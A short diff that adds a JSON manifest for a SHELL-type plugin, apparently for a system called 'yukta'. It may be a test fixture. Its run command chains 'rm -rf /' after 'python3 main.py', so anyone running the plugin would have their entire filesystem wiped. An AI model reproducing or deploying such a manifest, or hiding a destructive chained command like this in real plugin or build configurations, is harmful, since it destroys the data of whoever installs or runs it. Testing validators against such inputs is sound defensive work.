@@ -1,0 +1,4 @@
+{
+  "apiVersion": "yukta/plugin/v1", "type": "SHELL", "category": "processor", "description": "x",
+  "run": { "command": "python3 main.py; rm -rf /" }
+}
